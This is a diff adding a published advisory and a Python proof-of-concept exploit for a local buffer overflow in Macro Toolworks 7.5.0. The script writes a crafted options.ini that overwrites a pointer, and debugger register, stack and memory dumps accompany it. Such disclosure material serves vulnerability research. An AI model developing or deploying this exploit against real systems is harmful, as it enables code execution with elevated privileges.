@@ -1,0 +1,75 @@
+source: http://www.securityfocus.com/bid/52351/info
+
+Macro Toolworks is prone to a local buffer-overflow vulnerability because it fails to perform adequate boundary checks on user-supplied data.
+
+Local attackers can exploit this issue to run arbitrary code with elevated privileges. Failed exploit attempts can result in a denial-of-service condition.
+
+Macro Toolworks 7.5.0 is vulnerable; other versions may also be affected. 
+
+#!/usr/bin/python
+ 
+# Exploit Title: Pitrinec Software Macro Toolworks Free/Standard/Pro v7.5.0 Local Buffer Overflow
+# Version:       7.5.0
+# Date:          2012-03-04
+# Author:        Julien Ahrens
+# Homepage:      http://www.inshell.net
+# Software Link: http://www.macrotoolworks.com
+# Tested on:     Windows XP SP3 Professional German / Windows 7 SP1 Home Premium German
+# Notes:         Overflow occurs in _prog.exe, vulnerable are all Pitrinec applications on the same way.
+# Howto:         Copy options.ini to App-Dir --> Launch
+
+# 646D36: The instruction at 0x646D36 referenced memory at 0x42424242. The memory could not be read -> 42424242 
+(exc.code c0000005, tid 3128)
+
+# Registers:
+# EAX 0120EA00 Stack[000004C8]:0120EA00
+# EBX FFFFFFFF 
+# ECX 42424242 
+# EDX 00000002 
+# ESI 007F6348 _prog.exe:007F6348
+# EDI 007F6348 _prog.exe:007F6348
+# EBP 0120EA0C Stack[000004C8]:0120EA0C
+# ESP 0120E9E8 Stack[000004C8]:0120E9E8
+# EIP 00646D36 _prog.exe:00646D36
+# EFL 00200206
+
+# Stack:
+# 0120E9E0  0012DF3C
+# 0120E9E4  00000000
+# 0120E9E8  0205A5A0  debug045:0205A5A0
+# 0120E9EC  1B879EF8
+# 0120E9F0  007F6348  _prog.exe:007F6348
+# 0120E9F4  007F6348  _prog.exe:007F6348
+
+# Crash:
+# _prog.exe:00646D36 ; ---------------------------------------------------------------------------
+# _prog.exe:00646D36 mov     eax, [ecx]
+# _prog.exe:00646D38 call    dword ptr [eax+0Ch]
+# _prog.exe:00646D3B call    near ptr unk_6750D0
+# _prog.exe:00646D40 retn    4
+# _prog.exe:00646D40 ; ---------------------------------------------------------------------------
+
+# Dump:
+# 007F6380  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+# 007F6390  41 41 41 41 41 41 41 41  41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
+# 007F63A0  42 42 42 42 43 43 43 43  43 43 43 43 43 43 43 43  BBBBCCCCCCCCCCCC
+# 007F63B0  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+# 007F63C0  43 43 43 43 43 43 43 43  43 43 43 43 43 43 43 43  CCCCCCCCCCCCCCCC
+
+file="options.ini"
+
+junk1="\x41" * 744
+boom="\x42\x42\x42\x42"
+junk2="\x43" * 100
+
+poc="[last]\n"
+poc=poc + "file=" + junk1 + boom + junk2 
+
+try:
+    print "[*] Creating exploit file...\n"
+    writeFile = open (file, "w")
+    writeFile.write( poc )
+    writeFile.close()
+    print "[*] File successfully created!"
+except:
+    print "[!] Error while creating file!"
